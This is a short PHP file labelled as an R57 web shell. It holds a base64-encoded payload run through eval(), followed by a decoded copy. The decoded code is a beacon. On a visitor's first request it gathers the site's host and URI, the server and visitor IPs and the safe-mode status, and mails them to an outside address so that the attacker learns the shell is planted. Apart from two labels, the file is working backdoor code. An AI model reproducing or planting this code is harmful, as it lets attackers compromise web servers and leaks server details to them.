<?php
/**
* sh.php (R57 shell)
* Receiver: i.conficker@yahoo.com
**/
//Obfubuscated:
$datapipe_pm="c2Vzc2lvbl9zdGFydCgpOw0KaWYgKCFpc3NldCgkX1NFU1NJT05bJ2JhamFrJ10pKQl7DQoJJHZp
c2l0Y291bnQgPSAwOw0KCSR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQoJJGluaiA9ICRf
U0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KCSRib2R5ID0gImFkYSB5YW5nIGluamVjdCBcbiR3ZWIk
aW5qIjsNCgkkc2FmZW0wZGUgPSBAaW5pX2dldCgnc2FmZV9tb2RlJyk7DQoJCWlmICgkc2FmZW0w
ZGU9MSkgeyRzZWN1cml0eT0gIlNBRkVfTU9ERSA9IE9OIjt9DQoJCWVsc2UgeyRzZWN1cml0eT0g
IlNBRkVfTU9ERSA9IE9GRiI7fTsNCgkkc2VycGVyPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NF
UlZFUl9BRERSJ10pOw0KCSRpbmpla3RvciA9IGdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1JFTU9U
RV9BRERSJ10pOw0KCW1haWwoImkuY29uZmlja2VyQHlhaG9vLmNvbSIsICIkYm9keSIsIkZvdW5k
IGh0dHA6Ly8kd2ViJGlualxuJHNlY3VyaXR5XG5JUCBTZXJ2ZXIgPSAkc2VycGVyXG4gSVAgSW5q
ZWN0b3I9ICRpbmpla3RvciIpOw0KCSRfU0VTU0lPTlsnYmFqYWsnXSA9IDA7DQoJfQ0KZWxzZSB7
JF9TRVNTSU9OWydiYWphayddKys7fTs="; echo eval(base64_decode($datapipe_pm));
//Deobfubuscated:
session_start();
if (!isset($_SESSION['bajak']))	{
	$visitcount = 0;
	$web = $_SERVER["HTTP_HOST"];
	$inj = $_SERVER["REQUEST_URI"];
	$body = "ada yang inject \n$web$inj";
	$safem0de = @ini_get('safe_mode');
		if ($safem0de=1) {$security= "SAFE_MODE = ON";}
		else {$security= "SAFE_MODE = OFF";};
	$serper=gethostbyname($_SERVER['SERVER_ADDR']);
	$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
	mail("i.conficker@yahoo.com", "$body","Found http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
	$_SESSION['bajak'] = 0;
	}
else {$_SESSION['bajak']++;};
